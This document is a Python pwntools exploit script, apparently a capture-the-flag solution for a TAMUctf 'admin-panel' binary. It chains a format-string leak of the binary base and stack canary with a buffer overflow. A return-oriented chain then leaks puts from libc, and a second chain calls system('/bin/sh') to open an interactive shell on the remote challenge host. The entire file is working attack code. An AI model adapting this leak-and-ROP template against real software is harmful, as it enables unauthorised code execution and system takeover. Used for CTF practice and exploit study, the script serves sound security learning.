#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('admin-panel_patched')
# context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
libc = exe.libc 

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    username = 'admin' 
    offset = '%1$p.%15$p'
    password = 'secretpass123' + 'A'*19 + offset

    io.sendlineafter('16:', username)
    io.sendlineafter('24:', password)

    io.recvuntil('admin\n')
    leaks = io.recvline().split(b'.')
    exe.address = int(leaks[0], 16) - 0x234d
    canary = int(leaks[1], 16)

    info("elf base: %#x", exe.address)
    info("canary: %#x", canary)

    io.sendline('2')

    offset = 72
    pop_rdi = exe.address + 0x000000000000152b # pop rdi; ret; 
    ret = exe.address + 0x0000000000001016 # ret; 

    payload = flat({
        offset: [
            canary,
            b'A'*8,
            pop_rdi,
            exe.got['puts'],
            exe.plt['puts'],
            exe.sym['main']
        ]
    })

    io.sendline(payload)
    io.recvuntil('submitted!\n')
    puts = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = puts - libc.sym['puts']

    info("libc base: %#x", libc.address)

    io.sendline('admin')
    io.sendline('secretpass123')
    io.sendline('2')

    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    payload = flat({
        offset: [
            canary,
            b'A'*8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

